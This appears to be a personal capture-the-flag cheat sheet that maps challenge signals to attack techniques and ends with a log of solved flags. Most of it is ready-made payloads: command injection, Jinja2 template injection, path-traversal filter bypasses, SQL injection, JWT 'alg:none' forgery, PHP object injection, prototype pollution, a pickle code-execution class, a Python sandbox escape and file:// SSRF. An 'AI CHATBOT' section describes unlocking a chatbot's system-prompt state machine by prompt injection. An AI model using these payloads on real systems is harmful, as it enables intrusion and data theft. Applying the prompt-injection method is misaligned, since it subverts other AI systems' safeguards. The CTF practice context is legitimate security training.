# CTF PLAYBOOK — Trained Combat Reference

My internalized attack patterns from every solved challenge. I update this after each solve.

---

## SPEED PROTOCOL (every challenge)
1. **Recon in 1 shot** — fetch raw HTML, robots.txt, JS files, all in parallel. For netcat: connect + read prompt.
2. **Pattern-match instantly** from the tables below.
3. **Exploit in one script** — chain register→login→escalate→flag.
4. **Verify flag is real** — read the flag NAME (decoys say "fake"/"keep_trying"/"honeypot").
5. **Write the writeup** — folder under `writeups/NN-name/writeup.txt`, human-written.

---

## WEB — instant reflexes

| Signal | Technique | Payload |
|---|---|---|
| ping/host form | Command injection | `127.0.0.1; cat /etc/flag` ; filtered → `127.0.0.1|cat${IFS}/etc/flag.txt` |
| search/template field | Jinja2 SSTI | `{{7*7}}` probe → `{{lipsum.__globals__.os.popen('cat /etc/flag').read()}}` |
| `?path=` / `?file=` / image loader | LFI | `?path=/etc/flag.txt` ; source via `php://filter/convert.base64-encode/resource=index.php` |
| LFI with `../` stripped | str_replace single-pass | `/var/www/html/.....///.....///.....///etc/flag.txt` (`.....///`→`../`) |
| profile/update JSON API | Mass assignment | add `"role":"admin"` to the update body |
| JS-only auth / cookies | Client-side bypass | set cookies manually (`role=admin;verified=true`), open `/admin` directly |
| login form | SQLi tautology | `' OR '1'='1` in user+pass |
| md5(role) cookie | Cookie forge | send `admin|` + md5("admin") |
| JWT token | alg:none / weak secret | forge `{"alg":"none"}` header, role=admin, empty sig ; or brute theme-word secret |
| PHP unserialize cookie | Object injection + ref | `O:5:"Admin":3:{...;s:11:"your_secret";R:3;}` (R:N reference) |
| merge/deep-merge API | Prototype pollution | `{"__proto__":{"role":"admin"}}` |
| "deleted" record | Soft-delete bypass | `?deleted=true&pass=<key>` |
| market/purchase w/ balance | Race/TOCTOU | asyncio+aiohttp, fire 30 concurrent buys |
| headless browser renderer, local resources | SSRF/LFI via `file://` + internal ports | `<iframe src="file:///etc/flag">`, drive internal chromedriver |
| chall-manager/k8s/docker API on internal IP | unauth infra API | GET `http://<internalIP>:8080/api/v1/challenge` |

## CRYPTO / ENCODING (esp. netcat, per-instance flags)
- Single-byte XOR → brute 256, pick printable
- Caesar → brute 25 ; ROT13 (shift 13) ; ROT47 (printable 33-126 by 47) ; Atbash (A↔Z mirror, self-inverse)
- Morse → standard table
- base64→base32 chains ; hex-decode then reverse
- RSA: Hastad small-e ; nonce reuse ; XOR crib drag ; MD5 collision
- **Netcat pattern:** connect → parse prompt regex → decode → send `\n` → read flag. Automate; flag value changes per instance but pipeline is constant.

## REVERSE ENGINEERING
- `strings` + regex for flag ; ROT-encoded flags in binary
- PyInstaller ELF → `pyinstxtractor.py` → search `.pyc` bytecode
- Pickle RCE: `class R: def __reduce__(self): return (eval,("__import__('os').environ.get('FLAG')",))`
- Python eval sandbox escape: `().__class__.__base__.__subclasses__()[N].__init__.__globals__['system']('env')` (find os._wrap_close)
- WASM: often a red herring ("seems important, it is not") ; APK → decompile

## STEGO / FORENSICS
- LSB extraction (images) ; spectrogram (WAV) ; bit-plane analysis
- EXIF/strings on image binary for creds
- ONNX/model weights: extract float32 bytes, take int LSB, group 8 bits
- QR repair ; FAT32 disk carve ; PDF redaction removal/OCR
- robots.txt → hidden dirs

## AI CHATBOT (prompt injection)
- Find system-prompt STATE MACHINE ; unlock with challenge's OWN thematic language
- Ignore decoy flags in HTML comments ; generic jailbreaks get deflected
- Manas-Yantra: walk 5 Koshas in order → declare "Aham Brahmasmi" → flag

## ORACLE CHAINED-TRIALS (`/begin /trial /vow /heart`)
- Loop begin→trial→vow N times per session, then GET /heart for flag
- Per-trial answer often PoW: find nonce s.t. `sha256(s+nonce)` has leading zeros
- Watch for time-gated `/heart` ("return at the one hour")

## BLOCKCHAIN / HASH-CHAIN (Ashen-style)
- Verify seals `sha256(f"{h}|{parent}|{data}")`
- Build canonical value: rotate seal left by height nibbles, XOR into `sha256(seedstring)`
- Mine PoW `00000` prefix ; compute witness per stated formula ; respect cooldown (429)
- Solidity: check `isSolved()` conditions, reentrancy on withdraw, `ecrecover`, delegatecall, address-suffix (`& 0xffff == 0xda7e`)

## PoW LOGIN GATE (QuantumVault)
- `int(sha256(challenge+nonce),16) < 2**(256-bits)` ; solve fast per attempt, then real exploit

## zkSNARK / GROTH16 PROOF FORGERY (impossible)
- Signal: "convince the verifier", "ceremony/ashes", "secret not hidden well enough" = leaked TOXIC WASTE (tau)
- If setup secrets (alpha,beta,gamma,delta) derivable from a leaked `tau`, forge a proof for ANY public input (no witness needed)
- Verification eq (bellman/groth16): `e(A,B) = e(alpha_g1,beta_g2)*e(acc,gamma_g2)*e(C,delta_g2)`, acc = IC0 + claim*IC1
- Forge: A=alpha_g1, B=beta_g2, then C = -(acc_exp)*gamma/delta (solve so e(acc,gamma)*e(C,delta)=1)
- WATCH: vk may use SCALED generators (s1*G1, s2*G2) — dump vk.bin, compare every element, include the scale factor in C
- Secret files often ROT13/obfuscated ("not hidden well enough"). Rust: use pinned crates, install `stable-x86_64-pc-windows-gnu` if no MSVC linker
- Serialize proof a||b||c compressed points, verify locally against bundled vk before submitting; server may need TLS (python ssl)

---

## META-RULES (burned in)
1. The flag NAME is the hint — and decoys announce themselves as fake.
2. View raw source FIRST (bypasses client-side F12/right-click blocks).
3. robots.txt, JS files, HTML comments — always check.
4. "Impressive security" in description = red herring.
5. Environment variables over files after RCE (`env`/`printenv`).
6. Don't repeat a failing approach twice — pivot.
7. Per-instance netcat: automate the whole connect→decode→send loop.

---

## SOLVED FLAG LOG
- Switch It Up → `TDHT{9b50dac4fee96a5cd4e5b4f2a9c3d66f7a4e}` (mass assignment)
- Shopping L2/L3 → `TDHT{5640e184eecc1d886f8d3614e1254b0702f7}` (str_replace bypass)
- Wakandan Vault → `CHAKRA{p1_xor_single-4BEF69}` (XOR brute)
- Admin ERP → `CHAKRA{Y0U_CRACK3D_4DM1N}` (cookie + Caesar-14)
- Stark Telemetry → `CHAKRA{p1_morse-632C1D}` (Morse)
- I Am Groot → `CHAKRA{p1_reverse_hex-FEA36F}` (hex+reverse)
- SHIELD Intercept → `CHAKRA{p1_base_chain-2FBE8A}` (b64→b32)
- Mirror Dimension → `CHAKRA{p1_atbash-74D668}` (Atbash)
- Server's Secret → `CHAKRA{r0b0ts_4nd_c43s4r_s3cr3t}` (robots+ROT13)
- Loki's Cipher → `CHAKRA{p1_caesar-DC83FC}` (Caesar brute)
- ROT47 Quantum → `CHAKRA{p1_rot47-5709B7}`
- Breach Stark (SQLi) → `CHAKRA{p2_sqli_login-4F64FA}`
- Sanctum Archives → `CHAKRA{p2_path_traversal-9B3D8F}` (../../../etc/flag no ext)
- Ultron Diagnostics → `CHAKRA{p2_cmd_injection-E55621}`
- HYDRA Portal → `CHAKRA{p2_cookie_forge-3A6723}` (admin|md5(admin))
- Kavach-X → `CHAKRA{abhimanyu_would_be_proud_you_breached_the_kavach}` (b64 comment + Morse + ROT13)
- 7 Gates → mass-assign role + SQLi + JWT none + SSRF chain
- Chakra Story → `CHAKRA{follow_THE_STORY}` (b64+Morse+b64+ROT13, join+reverse+leet)
- Manas-Yantra → `CHAKRA{M4N4S_Y4nTR4_R3V34L3D_5757!}` (AI prompt injection)
- Ashen Checkpoint → hash-chain PoW witness
- Love is Complicated → oracle /begin/trial/vow/heart (in progress)
- DeckForge → headless-browser SSRF/LFI via file:// + internal chromedriver 40003 (in progress)
- impossible → `NNS{1MP0s51Bl3_PR00F5_fr0m_C3r3M0ny_45h3s}` (Groth16 forgery from leaked tau, scaled generators)
